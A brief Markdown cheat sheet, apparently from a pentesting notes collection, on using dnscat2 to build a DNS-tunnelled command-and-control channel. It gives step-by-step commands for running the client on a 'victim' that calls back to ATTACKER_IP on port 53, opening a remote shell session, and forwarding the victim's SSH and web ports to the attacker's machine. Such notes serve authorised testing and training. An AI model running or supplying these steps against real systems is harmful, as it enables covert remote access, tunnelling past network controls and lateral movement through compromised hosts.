# Dnscat2 

### DNScat2 is a tool which can be used to create a tunnel with the help of DNS protocol. A connection to port 53 should be established to access any data. DNScat2 mainly consists of a client and a Kali Linux.

## Github repo: https://github.com/iagox86/dnscat2

### Steps:

#### 1) Run dnscat2 server on Kali

    dnscat2-server (Kali Linux)

#### 2) Run dnscat on victim to connect to our Kali server via DNS

    ./dnscat --dns=server=ATTACKER_IP,port=53

#### 3) Select the newly created session on our Kali server

    session 

    session -i 1 

#### 4) We can create another session with this command

    shell

    session -i 2

#### 5) On our 2nd shell session, we can run different commands. For example, we can create an SSH tunnel this way.

    ifconfig 

    listen 127.0.0.1:8888 TARGET:22 (shell)

    ssh USER@127.0.0.1 -p 8888 (Kali)

 - listen 127.0.0.1:9999 192.168.226.129:80 (Port 80 tunneling)
